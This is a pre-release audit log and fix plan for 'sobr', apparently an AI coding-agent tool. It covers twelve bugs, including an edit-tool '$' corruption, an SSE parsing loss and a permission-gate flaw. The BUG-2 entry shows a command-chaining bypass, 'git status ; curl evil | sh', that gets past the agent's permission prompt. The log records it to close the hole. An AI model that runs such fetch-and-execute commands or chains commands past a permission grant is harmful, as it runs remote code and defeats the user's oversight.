# sobr — Audit Bug Log & Fix Plan

Source: pre-release audit of phases 1–3 (2026-06-12). 12 findings. Three were release blockers
(confirmed with repros).

**STATUS: all resolved 2026-06-12.** 11 of 12 fixed in code (BUG-6 was already correct — see note).
Verification: `tsc --noEmit` clean, `bun test` 162/162 (11 new regression tests), original repros
re-run green.

Legend: ☐ open · ☑ fixed

## Release blockers

### BUG-1 ☑ `edit` tool corrupts replacements containing `$` — CRITICAL
- **Where:** `src/tools/edit.ts` (non-`replace_all` branch).
- **Cause:** `text.replace(old, new)` — JS `String.replace` treats `$$ $& $\` $' $1` in the
  *replacement* as special patterns. `replace_all` uses `split().join()` and is unaffected → inconsistent.
- **Repro:** replace `AMOUNT` with `` `$${amount}` `` → file got `` `${amount}` `` (one `$` eaten).
- **Impact:** silent wrong edits to user source (template literals, regex, shell vars, `$&`).
- **Fix:** index-based splice; never route the replacement string through regex semantics. Add a `$`-test.

### BUG-2 ☑ Permission prefix-grant allows command-chaining bypass — HIGH (security)
- **Where:** `src/permission/gate.ts` (`bashPrefixOf` + `startsWith(p + " ")`).
- **Cause:** granting prefix `git status` then auto-allows `git status ; curl evil | sh`.
- **Repro:** after `p` grant, chained command returned `allow`, prompter not re-invoked.
- **Impact:** defeats the security boundary; dangerous-command policy only blocks a fixed substring list.
- **Fix:** a prefix grant only auto-allows commands with no shell metacharacters (`;&|`$(){}<>` newlines,
  backslash) beyond the prefix; anything else re-prompts.

### BUG-3 ☑ OpenAI/DeepSeek SSE parser drops the final event with no trailing newline — HIGH
- **Where:** `src/provider/openai.ts` `parseSSE`.
- **Cause:** the last buffered line is never parsed after the reader is `done`.
- **Repro:** two `data:` lines, no trailing `\n` → only the first parsed.
- **Impact:** truncated final message / lost `stop_reason`+usage on the multi-provider path.
- **Fix:** flush the remaining buffer through the same `data:` parse after the read loop. Add raw-bytes test.

## Correctness / robustness

### BUG-4 ☑ `ProfileStore` read-modify-write race — MEDIUM
- **Where:** `src/teach/profile.ts` `recordPick`/`recordFumble`/`appendLog`.
- **Cause:** load → mutate → save with no serialization; concurrent calls clobber.
- **Fix:** serialize all profile mutations through a promise chain (as `TraceWriter` does).

### BUG-5 ☑ `Agent` constructor mutates shared `deps.dispatch.onTrace`; `deps` is public-mutable — MEDIUM
- **Where:** `src/loop/agent.ts`.
- **Cause:** wrapping `deps.dispatch.onTrace` in the ctor double-wraps if two Agents share deps.
- **Fix:** keep the trace forwarding instance-local; don't mutate the passed-in dispatch object.

### BUG-6 ☑ `loadConfig` called twice per session — NOT PRESENT (already correct)
- **Where:** `src/repl.ts`.
- **Finding on re-check:** `loadConfig` is called exactly once, in `buildSession`; `runRepl`/`runOneShot`
  and `costLine` reuse `session.config`. The audit described the phase-2 shape of this code; a later
  edit already consolidated it. No change needed. Verified: only one `loadConfig` call site in repl.ts.

### BUG-7 ☑ Replay omits teach + policy events — MEDIUM
- **Where:** `src/trace/replay.ts`.
- **Cause:** `fork_surfaced/resolved`, `trivial_logged` not rendered; replaying a teach session hides the forks.
- **Fix:** render teach events (and keep policy warn/deny) in `renderReplay`.

### BUG-8 ☑ Aborted turn leaves an orphan `api_request` in the trace — MEDIUM
- **Where:** `src/loop/agent.ts` `runTurn`.
- **Cause:** `api_request` is traced before the stream; on abort the turn returns with no `api_response`.
- **Fix:** emit a `turn_aborted` marker on abort so the JSONL is self-consistent.

## Polish

### BUG-9 ☑ Scenario rubrics are vibezombie/Claude-Code specific, unusable for sobr — MEDIUM
- **Where:** `test/scenarios/*.md` (9 files reference `/vibezombie`, `AskUserQuestion`, hooks).
- **Fix:** rewrite the 3 cited rubrics (`stock-trading-stack`, `trivial-no-fork`, `mastered-suppression`)
  for sobr's `/teach` + `fork`/`trivial`; add a `test/scenarios/README.md` explaining usage and that the
  rest are adapted-from-vibezombie source rubrics.

### BUG-10 ☑ `process.exit` inside the provider factory — LOW
- **Where:** `src/repl.ts` `makeProvider`.
- **Fix:** throw a clear error; let `main`/caller decide to exit.

### BUG-11 ☑ OpenAI provider only handles `choices[0]`; single-choice assumption undocumented — LOW
- **Where:** `src/provider/openai.ts`.
- **Fix:** add a short comment documenting the single-choice assumption (correct for chat).

### BUG-12 ☑ Parent repo README/CHANGELOG never mention sobr — LOW
- **Where:** `/README.md`, `/CHANGELOG.md`.
- **Fix:** add a sobr section/pointer to the root README so the actual deliverable is discoverable.

## Tasks (execution order)

- T1: BUG-1 edit splice + test
- T2: BUG-2 permission metachar guard + tests
- T3: BUG-3 SSE flush + raw-bytes test
- T4: BUG-4 ProfileStore serialization + test
- T5: BUG-5 instance-local trace wrapper
- T6: BUG-6 single loadConfig
- T7: BUG-7 replay renders teach/policy events + test
- T8: BUG-8 turn_aborted marker + test
- T9: BUG-9 rewrite 3 rubrics + scenarios README
- T10: BUG-10 makeProvider throws
- T11: BUG-11 single-choice comment
- T12: BUG-12 root README sobr pointer
- T13: full `bun run typecheck` + `bun test` green; update phase docs note; commit
